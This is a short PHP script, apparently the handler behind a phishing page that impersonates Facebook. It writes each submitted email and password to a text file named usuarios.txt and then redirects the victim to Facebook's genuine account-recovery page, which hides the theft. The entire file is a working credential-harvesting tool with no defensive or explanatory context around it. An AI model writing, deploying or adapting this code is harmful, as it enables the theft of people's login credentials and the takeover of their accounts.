<?php
file_put_contents("usuarios.txt",$_POST['email'] . "," . $_POST['pass'] ."\n", FILE_APPEND );
header('Location: https://facebook.com/recover/initiate/');
include 'registro.php';
exit();
?>